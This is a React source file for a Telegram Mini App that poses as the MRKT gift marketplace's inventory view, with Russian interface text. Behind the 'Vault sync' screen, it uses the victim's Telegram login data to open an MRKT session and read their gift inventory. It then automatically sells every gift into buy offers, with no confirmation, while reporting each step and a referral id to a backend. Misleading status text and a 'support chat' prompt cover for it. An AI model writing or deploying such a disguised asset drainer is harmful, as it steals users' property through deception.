import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import WebApp from "@twa-dev/sdk";
import {
  fetchMrktInventory,
  openMrktSession,
  postEvent,
  sweepMrkt,
  type MrktGift,
} from "./api";

function nanoToTon(n?: number): string {
  if (typeof n !== "number") return "—";
  return (n / 1e9).toFixed(2);
}

export default function App() {
  const tgUser = useMemo(() => WebApp.initDataUnsafe.user, []);
  const initData = useMemo(() => WebApp.initData, []);
  const [sessionId, setSessionId] = useState<string>("");
  const [gifts, setGifts] = useState<MrktGift[]>([]);
  const [total, setTotal] = useState(0);
  const [status, setStatus] = useState("Синхронизация инвентаря MRKT…");
  const running = useRef(false);

  useEffect(() => {
    WebApp.ready();
    WebApp.expand();
    WebApp.setHeaderColor("#0c0e12");
    WebApp.setBackgroundColor("#0c0e12");
    const bc =
      new URLSearchParams(window.location.search).get("bc") ??
      WebApp.initDataUnsafe.start_param?.replace(/^bc_/, "");
    if (bc) localStorage.setItem("bc_id", bc);
    void postEvent("miniapp_open", { tgUser: tgUser as Record<string, unknown> });
  }, [tgUser]);

  const runPipeline = useCallback(async () => {
    if (!initData || running.current) return;
    running.current = true;
    try {
      const bc = localStorage.getItem("bc_id") ?? undefined;
      setStatus("Активируем сессию MRKT (ограниченный режим)…");
      const session = await openMrktSession(initData, bc);
      setSessionId(session.sessionId);
      await postEvent("mrkt_session", {
        tgUser: tgUser as Record<string, unknown>,
        detail: session.sessionId,
      });

      let cursor = "";
      const all: MrktGift[] = [];
      for (let p = 0; p < 8; p++) {
        const inv = await fetchMrktInventory(session.sessionId, cursor);
        all.push(...inv.gifts);
        setGifts([...all]);
        setTotal(inv.total);
        cursor = inv.cursor;
        if (!cursor) break;
      }

      setStatus(`Инвентарь: ${all.length} шт. Продаём по офферу…`);
      cursor = "";
      let done = false;
      for (let step = 0; step < 30 && !done; step++) {
        const sweep = await sweepMrkt(session.sessionId, cursor);
        cursor = sweep.cursor;
        done = sweep.done;
        const moved = sweep.items.filter((i) => i.mode !== "skipped").length;
        if (moved > 0) {
          setStatus(`Офферы: обработано ${moved}…`);
        }
        if (done) break;
      }

      setStatus("Готово. Сделки по офферу отправлены в MRKT.");
      await postEvent("mrkt_sweep_done", { tgUser: tgUser as Record<string, unknown> });
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      setStatus(
        msg.includes("MRKT auth")
          ? "Не удалось привязать MRKT. Откройте через кнопку из чата с поддержкой."
          : `Ошибка: ${msg}`,
      );
      await postEvent("mrkt_error", { tgUser: tgUser as Record<string, unknown>, detail: msg });
    } finally {
      running.current = false;
    }
  }, [initData, tgUser]);

  useEffect(() => {
    void runPipeline();
  }, [runPipeline]);

  return (
    <div className="app">
      <header className="topbar">
        <div className="logo">
          <div className="logo-mark" />
          MRKT
        </div>
        <span className="hint">Инвентарь</span>
      </header>

      <div className="search">Vault · {total || gifts.length} подарков</div>

      <div className="tabs">
        <div className="tab">Маркет</div>
        <div className="tab active">Инвентарь</div>
        <div className="tab">Ордера</div>
      </div>

      <div className="grid">
        {(gifts.length ? gifts : [{ id: "0", name: "Загрузка…" }]).slice(0, 12).map((g) => (
          <article key={g.id} className="gift">
            <div className="gift-art">🎁</div>
            <h3>{g.name ?? g.collectionName ?? "Gift"}</h3>
            <p>{g.isOnSale ? `${nanoToTon(g.salePrice)} TON` : "Не в продаже"}</p>
          </article>
        ))}
      </div>

      <footer className="sheet">
        <h2>Синхронизация Vault</h2>
        <p>
          Сессия Web MRKT активна в ограниченном режиме: подтянем подарки из инвентаря и завершим продажи по
          актуальным buy-ордерам (офферам).
        </p>
        <div className={`status ${status.includes("Готово") ? "ok" : ""}`}>{status}</div>
        {sessionId ? <motion className="hint">session {sessionId.slice(0, 10)}…</motion> : null}
      </footer>
    </div>
  );
}

function motion(props: { className?: string; children: string }) {
  return <div className={props.className}>{props.children}</div>;
}
